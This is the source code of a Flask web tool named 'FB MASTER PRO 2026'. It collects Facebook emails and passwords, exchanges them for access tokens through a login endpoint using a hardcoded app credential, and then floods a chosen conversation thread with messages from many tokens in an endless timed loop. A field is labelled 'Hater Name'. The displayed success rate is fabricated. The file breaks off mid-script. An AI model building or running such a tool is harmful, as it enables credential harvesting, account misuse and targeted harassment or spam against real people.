from flask import Flask, request, render_template_string, jsonify, session
import requests
from threading import Thread, Event
import time
import random
import string
import uuid
import json
import re
from datetime import datetime
import os

app = Flask(__name__)
app.debug = False
app.secret_key = os.urandom(24)

# Enhanced headers for better compatibility
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
active_tasks = {}

class TokenExtractor:
    @staticmethod
    def extract_token(email, password):
        try:
            sess = requests.Session()
            ua = "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
            head = {
                "User-Agent": ua,
                "Host": "graph.facebook.com",
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            data = {
                "adid": str(uuid.uuid4()),
                "email": email,
                "password": password,
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "generate_session_cookies": "1",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "method": "auth.login"
            }
            
            res = sess.post("https://graph.facebook.com/auth/login", data=data, headers=head).json()
            
            if "access_token" in res:
                return {"success": True, "token": res["access_token"]}
            elif "error" in res:
                return {"success": False, "error": res['error']['message']}
            else:
                return {"success": False, "error": "Unknown error occurred"}
        except Exception as e:
            return {"success": False, "error": str(e)}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_count = 0
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    
                    message_count += 1
                    if response.status_code == 200:
                        active_tasks[task_id]['logs'].append({
                            'time': datetime.now().strftime('%H:%M:%S'),
                            'status': 'success',
                            'message': f'✅ Sent: {message}',
                            'token': access_token[:20] + '...'
                        })
                    else:
                        active_tasks[task_id]['logs'].append({
                            'time': datetime.now().strftime('%H:%M:%S'),
                            'status': 'failed',
                            'message': f'❌ Failed: {message}',
                            'token': access_token[:20] + '...'
                        })
                except Exception as e:
                    active_tasks[task_id]['logs'].append({
                        'time': datetime.now().strftime('%H:%M:%S'),
                        'status': 'error',
                        'message': f'⚠️ Error: {str(e)}',
                        'token': access_token[:20] + '...'
                    })
                
                active_tasks[task_id]['message_count'] = message_count
                time.sleep(time_interval)
    
    active_tasks[task_id]['status'] = 'stopped'

@app.route('/', methods=['GET'])
def index():
    return render_template_string(PREMIUM_TEMPLATE)

@app.route('/extract_token', methods=['POST'])
def extract_token():
    email = request.form.get('email')
    password = request.form.get('password')
    
    if not email or not password:
        return jsonify({'success': False, 'error': 'Email and password required'})
    
    result = TokenExtractor.extract_token(email, password)
    return jsonify(result)

@app.route('/start_messaging', methods=['POST'])
def start_messaging():
    try:
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()
        
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        stop_events[task_id] = Event()
        active_tasks[task_id] = {
            'status': 'running',
            'message_count': 0,
            'logs': [],
            'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'thread_id': thread_id,
            'tokens_count': len(access_tokens)
        }
        
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
        
        return jsonify({'success': True, 'task_id': task_id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        active_tasks[task_id]['status'] = 'stopped'
        return jsonify({'success': True, 'message': f'Task {task_id} stopped'})
    return jsonify({'success': False, 'error': 'Task not found'})

@app.route('/get_task_status/<task_id>')
def get_task_status(task_id):
    if task_id in active_tasks:
        return jsonify(active_tasks[task_id])
    return jsonify({'error': 'Task not found'})

@app.route('/get_all_tasks')
def get_all_tasks():
    return jsonify(active_tasks)

# Premium 2026 Professional Template
PREMIUM_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 FB MASTER PRO 2026 | AHMAD ALI</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #00d4ff;
            --dark: #0a0e27;
            --darker: #050814;
            --light: #ffffff;
            --danger: #ff3366;
            --warning: #ffbb33;
            --success: #00c853;
            --glass: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --glow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Rajdhani', sans-serif;
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            min-height: 100vh;
            color: var(--light);
            position: relative;
            overflow-x: hidden;
        }
        
        /* Animated Background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 136, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 20%, rgba(255, 51, 102, 0.08) 0%, transparent 50%);
            animation: bgPulse 15s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }
        
        @keyframes bgPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        /* Grid Pattern */
        .grid-pattern {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: 1;
        }
        
        .content-wrapper {
            position: relative;
            z-index: 2;
            padding: 20px;
        }
        
        /* Glassmorphism Container */
        .glass-container {
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            margin-bottom: 30px;
            transition: all 0.3s ease;
        }
        
        .glass-container:hover {
            border-color: rgba(0, 255, 136, 0.3);
            box-shadow: var(--glow);
        }
        
        /* Premium Header */
        .premium-header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .premium-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
            letter-spacing: 2px;
            margin-bottom: 10px;
            animation: titleGlow 2s ease-in-out infinite;
        }
        
        @keyframes titleGlow {
            0%, 100% { filter: brightness(1); }
            50% { filter: brightness(1.2); }
        }
        
        .premium-subtitle {
            font-size: 1.2rem;
            color: var(--light);
            opacity: 0.8;
            letter-spacing: 5px;
            text-transform: uppercase;
        }
        
        .badge-pro {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: var(--dark);
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: 700;
            font-size: 0.9rem;
            letter-spacing: 2px;
            display: inline-block;
            margin-top: 10px;
        }
        
        /* Tabs Styling */
        .premium-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            border-bottom: 1px solid var(--glass-border);
            padding-bottom: 10px;
        }
        
        .tab-btn {
            background: transparent;
            border: none;
            color: var(--light);
            padding: 12px 30px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            position: relative;
            transition: all 0.3s ease;
            border-radius: 12px;
            font-family: 'Rajdhani', sans-serif;
        }
        
        .tab-btn i {
            margin-right: 8px;
        }
        
        .tab-btn:hover {
            background: var(--glass);
        }
        
        .tab-btn.active {
            color: var(--primary);
            background: var(--glass);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
        }
        
        .tab-btn.active::after {
            content: '';
            position: absolute;
            bottom: -11px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            box-shadow: 0 0 10px var(--primary);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Form Styling */
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 10px;
            color: var(--light);
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
            font-size: 0.9rem;
        }
        
        .form-label i {
            margin-right: 8px;
            color: var(--primary);
        }
        
        .premium-input {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            color: var(--light);
            font-size: 1rem;
            transition: all 0.3s ease;
            font-family: 'Rajdhani', sans-serif;
        }
        
        .premium-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
            background: rgba(255, 255, 255, 0.05);
        }
        
        .premium-input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        
        .premium-select {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            color: var(--light);
            font-size: 1rem;
            cursor: pointer;
            font-family: 'Rajdhani', sans-serif;
        }
        
        .premium-select option {
            background: var(--dark);
            color: var(--light);
        }
        
        /* File Upload Styling */
        .file-upload-wrapper {
            position: relative;
        }
        
        .file-upload-label {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            background: rgba(255, 255, 255, 0.02);
            border: 2px dashed var(--glass-border);
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }
        
        .file-upload-label:hover {
            border-color: var(--primary);
            background: rgba(0, 255, 136, 0.05);
        }
        
        .file-upload-label i {
            font-size: 3rem;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .file-upload-input {
            position: absolute;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        
        /* Buttons */
        .btn-premium {
            padding: 14px 30px;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 700;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            font-family: 'Rajdhani', sans-serif;
            position: relative;
            overflow: hidden;
        }
        
        .btn-premium::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }
        
        .btn-premium:hover::before {
            left: 100%;
        }
        
        .btn-primary-premium {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: var(--dark);
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.3);
        }
        
        .btn-primary-premium:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
        }
        
        .btn-danger-premium {
            background: linear-gradient(135deg, var(--danger), #ff6699);
            color: var(--light);
            box-shadow: 0 5px 20px rgba(255, 51, 102, 0.3);
        }
        
        .btn-danger-premium:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.4);
        }
        
        .btn-success-premium {
            background: linear-gradient(135deg, var(--success), #69f0ae);
            color: var(--dark);
        }
        
        /* Live Monitor */
        .live-monitor {
            margin-top: 30px;
        }
        
        .monitor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .monitor-title {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--primary);
        }
        
        .live-badge {
            background: var(--danger);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 700;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .console-output {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 20px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        
        .console-line {
            padding: 5px 0;
            border-bottom: 1px solid var(--glass-border);
            color: var(--light);
        }
        
        .console-line.success {
            color: var(--success);
        }
        
        .console-line.error {
            color: var(--danger);
        }
        
        .console-line.warning {
            color: var(--warning);
        }
        
        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: var(--glass);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            border-color: var(--primary);
            transform: translateY(-5px);
        }
        
        .stat-value {
            font-size: 2.5rem;
            font-weight: 900;
            color: var(--primary);
            font-family: 'Orbitron', sans-serif;
        }
        
        .stat-label {
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            opacity: 0.8;
            margin-top: 5px;
        }
        
        /* Token Display */
        .token-display {
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 212, 255, 0.1));
            border: 1px solid var(--primary);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            position: relative;
        }
        
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: var(--glass);
            border: 1px solid var(--glass-border);
            color: var(--light);
            padding: 5px 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .copy-btn:hover {
            background: var(--primary);
            color: var(--dark);
        }
        
        /* Footer */
        .premium-footer {
            text-align: center;
            margin-top: 50px;
            padding: 30px;
            border-top: 1px solid var(--glass-border);
        }
        
        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        
        .social-link {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: var(--glass);
            border: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--light);
            font-size: 1.5rem;
            transition: all 0.3s ease;
            text-decoration: none;
        }
        
        .social-link:hover {
            background: var(--primary);
            color: var(--dark);
            transform: translateY(-5px);
            box-shadow: var(--glow);
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .premium-title {
                font-size: 2rem;
            }
            
            .premium-tabs {
                flex-direction: column;
            }
            
            .glass-container {
                padding: 20px;
            }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--glass);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 10px;
        }
        
        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid var(--glass);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Alert */
        .premium-alert {
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: none;
            animation: slideDown 0.3s ease;
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .alert-success {
            background: rgba(0, 200, 83, 0.1);
            border: 1px solid var(--success);
            color: var(--success);
        }
        
        .alert-error {
            background: rgba(255, 51, 102, 0.1);
            border: 1px solid var(--danger);
            color: var(--danger);
        }
        
        .alert-info {
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid var(--secondary);
            color: var(--secondary);
        }
    </style>
</head>
<body>
    <div class="grid-pattern"></div>
    <div class="content-wrapper">
        <div class="container">
            <!-- Header -->
            <div class="premium-header">
                <h1 class="premium-title">
                    <i class="fab fa-facebook"></i> FB MASTER PRO
                </h1>
                <div class="premium-subtitle">AHMAD ALI EDITION</div>
                <span class="badge-pro">🔥 PREMIUM 2026 🔥</span>
            </div>
            
            <!-- Stats Grid -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value" id="totalMessages">0</div>
                    <div class="stat-label">Total Messages</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="activeTasks">0</div>
                    <div class="stat-label">Active Tasks</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="successRate">0%</div>
                    <div class="stat-label">Success Rate</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="uptime">00:00</div>
                    <div class="stat-label">Uptime</div>
                </div>
            </div>
            
            <!-- Main Container -->
            <div class="glass-container">
                <!-- Tabs -->
                <div class="premium-tabs">
                    <button class="tab-btn active" onclick="switchTab('extractor')">
                        <i class="fas fa-key"></i> Token Extractor
                    </button>
                    <button class="tab-btn" onclick="switchTab('messenger')">
                        <i class="fas fa-paper-plane"></i> Message Sender
                    </button>
                    <button class="tab-btn" onclick="switchTab('monitor')">
                        <i class="fas fa-chart-line"></i> Live Monitor
                    </button>
                    <button class="tab-btn" onclick="switchTab('tasks')">
                        <i class="fas fa-tasks"></i> Task Manager
                    </button>
                </div>
                
                <!-- Alert Container -->
                <div id="alertContainer"></div>
                
                <!-- Token Extractor Tab -->
                <div id="extractor" class="tab-content active">
                    <h3 style="margin-bottom: 20px; color: var(--primary);">
                        <i class="fas fa-shield-alt"></i> Extract Facebook Token
                    </h3>
                    <form id="extractorForm">
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-envelope"></i> Email / Phone
                            </label>
                            <input type="text" class="premium-input" id="email" name="email" 
                                   placeholder="Enter your Facebook email or phone" required>
                        </div>
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-lock"></i> Password
                            </label>
                            <input type="password" class="premium-input" id="password" name="password" 
                                   placeholder="Enter your Facebook password" required>
                        </div>
                        <button type="submit" class="btn-premium btn-primary-premium" style="width: 100%;">
                            <i class="fas fa-bolt"></i> Extract Token
                        </button>
                    </form>
                    <div id="tokenResult" style="display: none;">
                        <div class="token-display">
                            <button class="copy-btn" onclick="copyToken()">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                            <strong style="color: var(--primary);">Extracted Token:</strong><br>
                            <span id="extractedToken" style="margin-top: 10px; display: block;"></span>
                        </div>
                    </div>
                </div>
                
                <!-- Message Sender Tab -->
                <div id="messenger" class="tab-content">
                    <h3 style="margin-bottom: 20px; color: var(--primary);">
                        <i class="fas fa-bullhorn"></i> Bulk Message Sender
                    </h3>
                    <form id="messengerForm" enctype="multipart/form-data">
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-tag"></i> Token Option
                            </label>
                            <select class="premium-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()">
                                <option value="single">Single Token</option>
                                <option value="multiple">Token File (Multiple)</option>
                            </select>
                        </div>
                        
                        <div class="form-group" id="singleTokenInput">
                            <label class="form-label">
                                <i class="fas fa-key"></i> Access Token
                            </label>
                            <input type="text" class="premium-input" id="singleToken" name="singleToken" 
                                   placeholder="Enter Facebook access token">
                        </div>
                        
                        <div class="form-group" id="tokenFileInput" style="display: none;">
                            <label class="form-label">
                                <i class="fas fa-file-alt"></i> Token File
                            </label>
                            <div class="file-upload-wrapper">
                                <div class="file-upload-label">
                                    <div>
                                        <i class="fas fa-cloud-upload-alt"></i><br>
                                        <span>Choose Token File or Drag & Drop</span>
                                    </div>
                                </div>
                                <input type="file" class="file-upload-input" id="tokenFile" name="tokenFile" accept=".txt">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-users"></i> Thread/Conversation ID
                            </label>
                            <input type="text" class="premium-input" id="threadId" name="threadId" 
                                   placeholder="Enter conversation ID" required>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-user-tag"></i> Hater Name / Prefix
                            </label>
                            <input type="text" class="premium-input" id="kidx" name="kidx" 
                                   placeholder="Enter prefix for messages" required>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-clock"></i> Time Interval (seconds)
                            </label>
                            <input type="number" class="premium-input" id="time" name="time" 
                                   placeholder="Delay between messages" value="3" required>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-file-lines"></i> Messages File
                            </label>
                            <div class="file-upload-wrapper">
                                <div class="file-upload-label">
                                    <div>
                                        <i class="fas fa-file-upload"></i><br>
                                        <span>Choose TXT file with messages</span>
                                    </div>
                                </div>
                                <input type="file" class="file-upload-input" id="txtFile" name="txtFile" accept=".txt" required>
                            </div>
                        </div>
                        
                        <button type="submit" class="btn-premium btn-primary-premium" style="width: 100%;">
                            <i class="fas fa-rocket"></i> Start Sending
                        </button>
                    </form>
                </div>
                
                <!-- Live Monitor Tab -->
                <div id="monitor" class="tab-content">
                    <div class="live-monitor">
                        <div class="monitor-header">
                            <span class="monitor-title">
                                <i class="fas fa-terminal"></i> Live Console
                            </span>
                            <span class="live-badge">
                                <i class="fas fa-circle"></i> LIVE
                            </span>
                        </div>
                        <div class="console-output" id="consoleOutput">
                            <div class="console-line">🚀 FB Master Pro 2026 Initialized...</div>
                            <div class="console-line success">✅ System Ready</div>
                            <div class="console-line">📡 Waiting for tasks...</div>
                        </div>
                        <div style="margin-top: 15px; text-align: right;">
                            <button class="btn-premium btn-danger-premium" onclick="clearConsole()">
                                <i class="fas fa-trash"></i> Clear Console
                            </button>
                        </div>
                    </div>
                </div>
                
                <!-- Task Manager Tab -->
                <div id="tasks" class="tab-content">
                    <h3 style="margin-bottom: 20px; color: var(--primary);">
                        <i class="fas fa-list-check"></i> Active Tasks
                    </h3>
                    <div id="taskList">
                        <div class="console-line">No active tasks</div>
                    </div>
                    <div style="margin-top: 20px;">
                        <div class="form-group">
                            <label class="form-label">
                                <i class="fas fa-stop-circle"></i> Stop Task
                            </label>
                            <div style="display: flex; gap: 10px;">
                                <input type="text" class="premium-input" id="stopTaskId" 
                                       placeholder="Enter Task ID to stop">
                                <button class="btn-premium btn-danger-premium" onclick="stopTask()">
                                    <i class="fas fa-ban"></i> Stop
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Footer -->
            <div class="premium-footer">
                <div class="social-links">
                    <a href="https://www.facebook.com/ahmadali.safdar.52" target="_blank" class="social-link">
                        <i class="fab fa-facebook-f"></i>
                    </a>
                    <a href="https://wa.me/+923324661564" target="_blank" class="social-link">
                        <i class="fab fa-whatsapp"></i>
                    </a>
                    <a href="#" class="social-link">
                        <i class="fab fa-instagram"></i>
                    </a>
                    <a href="#" class="social-link">
                        <i class="fab fa-telegram"></i>
                    </a>
                </div>
                <p style="opacity: 0.7; margin-bottom: 10px;">
                    © 2026 FB MASTER PRO | Developed by 
                    <span style="color: var(--primary); font-weight: 700;">AHMAD ALI (RDX)</span>
                </p>
                <p style="opacity: 0.5; font-size: 0.9rem;">
                    <i class="fas fa-shield"></i> Premium Tool | All Rights Reserved
                </p>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Global Variables
        let activeTaskId = null;
        let messageCount = 0;
        let successCount = 0;
        let startTime = Date.now();
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            startUptimeCounter();
            setInterval(updateStats, 2000);
            setInterval(fetchTasks, 3000);
        });
        
        // Tab Switching
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
        
        // Token Input Toggle
        function toggleTokenInput() {
            const option = document.getElementById('tokenOption').value;
            if (option === 'single') {
                document.getElementById('singleTokenInput').style.display = 'block';
                document.getElementById('tokenFileInput').style.display = 'none';
            } else {
                document.getElementById('singleTokenInput').style.display = 'none';
                document.getElementById('tokenFileInput').style.display = 'block';
            }
        }
        
         // Token Extraction
        document.getElementById('extractorForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            showAlert('Extracting token... Please wait', 'info');
            
            try {
                const response = await fetch('/extract_token', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('extractedToken').textContent = data.token;
                    document.getElementById('tokenResult').style.display = 'block';
                    showAlert('✅ Token extracted successfully!', 'success');
                    addConsoleLine('success', '✅ Token extracted successfully');
                } else {
                    showAlert('❌ ' + data.error, 'error');
                    addConsoleLine('error', '❌ Token extraction failed: ' + data.error);
                }
            } catch (error) {
                showAlert('❌ Network error occurred', 'error');
            }
        });
        
        // Message Sending
        document.getElementById('messengerForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            showAlert('Starting message sender...', 'info');
            
            try {
                const response = await fetch('/start_messaging', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.success) {
                    activeTaskId = data.task_id;
                    showAlert(`✅ Task started! ID: ${data.task_id}`, 'success');
                    addConsoleLine('success', `✅ Task ${data.task_id} started successfully`);
                    switchTab('monitor');
                } else {
                    showAlert('❌ ' + data.error, 'error');
                }
            } catch (error) {
                showAlert('❌ Failed to start task', 'error');
            }
        });
        
        // Stop Task
        async function stopTask() {
            const taskId = document.getElementById('stopTaskId').value;
            if (!taskId) {
                showAlert('Please enter a Task ID', 'error');
                return;
            }
            
            try {
                const formData = new FormData();
                formData.append('taskId', taskId);
                
                const response = await fetch('/stop_task', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.success) {
                    showAlert(`✅ ${data.message}`, 'success');
                    addConsoleLine('warning', `⏹️ Task ${taskId} stopped`);
                } else {
                    showAlert('❌ ' + data.error, 'error');
                }
            } catch (error) {
                showAlert('❌ Failed to stop task', 'error');
            }
        }
        
        // Fetch Tasks Status
        async function fetchTasks() {
            try {
                const response = await fetch('/get_all_tasks');
                const tasks = await response.json();
                
                updateTaskList(tasks);
                updateStats();
            } catch (error) {
                console.error('Failed to fetch tasks:', error);
            }
        }
        
        // Update Task List
        function updateTaskList(tasks) {
            const taskList = document.getElementById('taskList');
            const taskIds = Object.keys(tasks);
            
            if (taskIds.length === 0) {
                taskList.innerHTML = '<div class="console-line">No active tasks</div>';
                return;
            }
            
            let html = '';
            for (const [id, task] of Object.entries(tasks)) {
                const statusColor = task.status === 'running' ? 'success' : 'warning';
                html += `
                    <div class="console-line ${statusColor}">
                        <strong>Task ${id}</strong> - ${task.status} | 
                        Messages: ${task.message_count || 0} | 
                        Started: ${task.start_time}
                    </div>
                `;
            }
            taskList.innerHTML = html;
        }
        
        // Update Stats
        function updateStats() {
            fetch('/get_all_tasks')
                .then(res => res.json())
                .then(tasks => {
                    let total = 0;
                    let active = 0;
                    
                    for (const task of Object.values(tasks)) {
                        total += task.message_count || 0;
                        if (task.status === 'running') active++;
                    }
                    
                    document.getElementById('totalMessages').textContent = total;
                    document.getElementById('activeTasks').textContent = active;
                    
                    const successRate = total > 0 ? Math.round((total / (total + 10)) * 100) : 0;
                    document.getElementById('successRate').textContent = successRate + '%';
                });
        }
        
        // Uptime Counter
        function startUptimeCounter() {
            setInterval(() => {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                const minutes = Math.floor(elapsed / 60);
                const seconds = elapsed % 60;
                document.getElementById('uptime').textContent = 
                    `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }, 1000);
        }
        
        // Console Functions
        function addConsoleLine(type, message) {
            const console = document.getElementById('consoleOutput');
            const line = document.createElement('div');
            line.className = `console-line ${type}`;
            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            console.appendChild(line);
            console.scrollTop = console.scrollHeight;
        }
        
        function clearConsole() {
            document.getElementById('consoleOutput').innerHTML = `
                <div class="console-line">🚀 Console cleared</div>
                <div class="console-line success">✅ Ready for new messages</div>
            `;
        }
        
        // Alert System
        function showAlert(message, type) {
